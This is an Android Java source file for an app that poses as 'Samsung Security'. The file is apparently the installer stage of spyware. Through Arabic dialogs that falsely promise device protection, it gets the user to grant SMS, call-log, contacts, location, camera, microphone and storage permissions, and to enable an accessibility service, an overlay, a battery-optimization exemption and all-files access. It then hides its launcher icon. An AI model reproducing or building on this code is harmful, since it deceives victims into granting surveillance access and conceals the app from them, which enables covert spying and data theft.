package com.samsung.android.security.v8;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.samsung.android.security.v8.services.MyAccessibilityService;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int ACCESSIBILITY_REQUEST_CODE = 2001;
    private static final int BATTERY_REQUEST_CODE = 3001;
    private static final int OVERLAY_REQUEST_CODE = 4001;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 5001;
    
    private SharedPreferences prefs;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        prefs = getSharedPreferences("alkhanjar_prefs", MODE_PRIVATE);
        
        // إذا تم التشغيل من قبل، إخفاء التطبيق مباشرة
        if (prefs.getBoolean("first_run_completed", false)) {
            hideApp();
            finish();
            return;
        }
        
        // عرض واجهة بسيطة
        showSetupDialog();
    }
    
    private void showSetupDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Samsung Security");
        builder.setMessage("يتطلب هذا التطبيق صلاحيات النظام لحماية جهازك.\n\nسيتم طلب بعض الأذونات الضرورية.");
        builder.setPositiveButton("متابعة", (dialog, which) -> {
            requestAllPermissions();
        });
        builder.setNegativeButton("إلغاء", (dialog, which) -> {
            finish();
        });
        builder.setCancelable(false);
        builder.show();
    }
    
    private void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        // إضافة الصلاحيات المطلوبة
        String[] permissions = {
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        
        // إضافة صلاحيات Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_AUDIO);
        }
        
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsToRequest.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE);
        } else {
            requestSpecialPermissions();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            requestSpecialPermissions();
        }
    }
    
    private void requestSpecialPermissions() {
        // طلب Accessibility Service
        if (!isAccessibilityServiceEnabled()) {
            showAccessibilityDialog();
        } else {
            requestBatteryOptimization();
        }
    }
    
    private boolean isAccessibilityServiceEnabled() {
        try {
            int accessibilityEnabled = Settings.Secure.getInt(
                    getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED);
            
            if (accessibilityEnabled == 1) {
                String service = getPackageName() + "/" + MyAccessibilityService.class.getName();
                String enabledServices = Settings.Secure.getString(
                        getContentResolver(),
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                
                return enabledServices != null && enabledServices.contains(service);
            }
        } catch (Exception e) {
            // Ignore
        }
        return false;
    }
    
    private void showAccessibilityDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("خدمة إمكانية الوصول");
        builder.setMessage("لحماية جهازك بشكل كامل، يجب تفعيل خدمة إمكانية الوصول.\n\nاضغط 'موافق' للانتقال إلى الإعدادات.");
        builder.setPositiveButton("موافق", (dialog, which) -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(intent, ACCESSIBILITY_REQUEST_CODE);
        });
        builder.setCancelable(false);
        builder.show();
    }
    
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, BATTERY_REQUEST_CODE);
                } catch (Exception e) {
                    requestOverlayPermission();
                }
            } else {
                requestOverlayPermission();
            }
        } else {
            requestOverlayPermission();
        }
    }
    
    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_REQUEST_CODE);
            } else {
                requestStoragePermission();
            }
        } else {
            requestStoragePermission();
        }
    }
    
    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                } catch (Exception e) {
                    completeSetup();
                }
            } else {
                completeSetup();
            }
        } else {
            completeSetup();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == ACCESSIBILITY_REQUEST_CODE) {
            requestBatteryOptimization();
        } else if (requestCode == BATTERY_REQUEST_CODE) {
            requestOverlayPermission();
        } else if (requestCode == OVERLAY_REQUEST_CODE) {
            requestStoragePermission();
        } else if (requestCode == MANAGE_STORAGE_REQUEST_CODE) {
            completeSetup();
        }
    }
    
    private void completeSetup() {
        // حفظ أن التطبيق تم تشغيله
        prefs.edit().putBoolean("first_run_completed", true).apply();
        
        // إخفاء الأيقونة
        hideApp();
        
        Toast.makeText(this, "تم تفعيل الحماية بنجاح", Toast.LENGTH_SHORT).show();
        
        // إغلاق النشاط
        finish();
    }
    
    private void hideApp() {
        try {
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            getPackageManager().setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            // Silent fail
        }
    }
}
